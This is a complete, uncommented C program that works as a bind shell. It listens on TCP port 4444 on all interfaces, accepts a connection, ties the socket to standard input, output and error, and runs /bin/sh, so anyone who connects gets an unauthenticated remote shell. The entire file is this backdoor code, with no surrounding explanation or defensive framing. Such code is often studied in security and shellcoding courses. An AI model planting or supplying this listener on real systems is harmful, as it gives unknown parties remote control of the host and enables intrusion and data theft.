#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define die(msg) \
	do { perror(msg); exit(1); } while (0)

int create_listener(int port);
void connect_to_shell(int connfd);

int main(void)
{
	int sockfd;
	int connfd;

	sockfd = create_listener(4444);
	connfd = accept(sockfd, NULL, NULL); 
	if (-1 == connfd) {
		die("accept");
	}

	connect_to_shell(connfd);

	return 0;
}

int create_listener(int port)
{
	int sockfd;
	struct sockaddr_in saddr;

	memset(&saddr, 0, sizeof(struct sockaddr));
	saddr.sin_family = AF_INET;
	saddr.sin_port = htons(port);

	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (-1 == sockfd) {
		die("socket");
	}

	int enable = 1;
	if (-1 == setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &enable, 
				sizeof(int))) {
		die("setsockopt(SO_REUSE_ADDR)");
	}

	if (-1 == bind(sockfd, (struct sockaddr *)&saddr, sizeof(saddr))) {
		die("bind");
	}

	if (-1 == listen(sockfd, 32)) {
		die("listen");
	}

	return sockfd;
}

void connect_to_shell(int connfd)
{
	dup2(connfd, 0);
	dup2(connfd, 1);
	dup2(connfd, 2);
	char* const args[] = {"/bin/sh", NULL};
	if (-1 == execv("/bin/sh", args)) {
		die("execv");
	}
}

